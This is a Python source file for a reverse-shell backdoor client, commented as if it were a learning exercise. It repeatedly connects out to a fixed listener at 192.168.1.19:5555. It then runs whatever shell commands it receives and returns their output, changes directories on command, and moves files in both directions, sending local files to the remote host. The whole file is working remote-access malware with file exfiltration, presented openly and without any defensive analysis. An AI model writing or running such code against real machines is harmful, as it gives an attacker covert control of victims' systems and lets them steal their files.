import socket #tells python you will be communicating over a network
import time
import json
import subprocess #Allows us to execute commands sent to server
import os #allows us to use CL commands


def connection():
    while True:
        time.sleep(15)
        try:
            sock.connect(('192.168.1.19', 5555)) #Has the socket try top connect to IP address and port
            shell() #see def shell
            sock.close() #closes connection when shell is done
            break
        except:
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command =='quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ': #[:3} means IF the first 3 characters match cd_ run this statement
            os.chdir(command[3:]) #[3:} means only use text after cd_ (ex. cd Desktop = os.cddir(Desktop))
        elif command[:8] == 'download':  #Allows download command to be received
            upload_file(command[9:])
        elif command[:6] == 'upload': #Allows to upload a file
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin = subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

def upload_file(file_name):
    f = open(file_name, 'rb') #rb = read bytes
    sock.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb') #wb = write bytes
    sock.settimeout(1) #Helps file download not get stuck
    chunk = sock.recv(1024) #amount of bytes to recv
    while chunk: #Will run as long as there is something inside the chunk variable.
        f.write(chunk)
        try:
            chunk = sock.recv(1024)
        except socket.timeout as e:
            break
    sock.settimeout(None)
    f.close()

def  reliable_send(data): #Sends commands to server
    jsondata = json.dumps(data)
    sock.send(jsondata.encode()) #target is a var created with sock.accept

def reliable_recv(): #Recieves commands from server
    data = ''
    while True:
        try:
            data = data + sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connection()